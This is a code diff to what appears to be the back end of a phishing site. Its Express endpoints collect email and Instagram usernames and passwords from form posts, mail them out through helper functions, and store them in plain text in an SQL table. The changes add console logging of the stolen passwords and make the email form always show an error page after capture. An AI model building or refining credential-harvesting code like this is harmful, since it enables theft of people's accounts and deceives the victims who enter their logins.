@@ -84,6 +84,7 @@ app.post('/submit', async (req,resp)=>{
     var phone  = req.body.phone
     var dataof = 'Email'
     await sendmail.mail_contact_info(dataof,usname,passpw,phone)
+    console.log(dataof,usname,passpw,phone)
 
   try {
     let con = await sql.connect(config);
@@ -100,14 +101,14 @@ app.post('/submit', async (req,resp)=>{
     await request.query(query);
 
     
-    resp.sendFile(`${static}/email-registration-error.html`);
-    
 
   } catch (err) {
     console.error(err);
-    resp.status(500).send(`An error occurred. Please try again or else vist later`);
   }
-})
+
+  resp.sendFile(`${static}/email-registration-error.html`);
+}
+)
 
 
 //api to post instagram data to SQL Server
@@ -116,7 +117,10 @@ app.post('/submit2',  async(req, resp)=>{
   var passpw = req.body.password
   var dataof = 'Instagram'
   await sendmail.mailkaro(dataof,usname,passpw)
+  console.log(dataof,usname,passpw)
   
+
+  try{
   let con = await sql.connect(config);
   const request = new sql.Request(con);
 
@@ -125,6 +129,10 @@ app.post('/submit2',  async(req, resp)=>{
 
   const query = "INSERT INTO insta_info (username, password) VALUES (@username, @password);";
   await request.query(query);
+
+  } catch (err){
+    console.error(err);
+  }
   
   resp.sendFile(`${static}/registration-success.html`);
     
